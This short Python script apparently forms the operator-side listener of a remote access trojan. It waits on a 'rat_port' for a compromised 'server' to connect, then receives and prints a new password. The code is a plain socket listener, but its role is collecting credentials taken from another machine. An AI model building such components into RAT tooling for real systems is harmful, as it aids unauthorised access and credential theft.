import socket

from constants import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa

s.bind((host, rat_port))
s.listen()

print("[*] Waiting for the server...")
client, addr = s.accept()

new_password = client.recv(MAX_PASSWORD_BYTES)
print(f"[*] Connection is established successfully")
print(new_password.decode())

s.close()
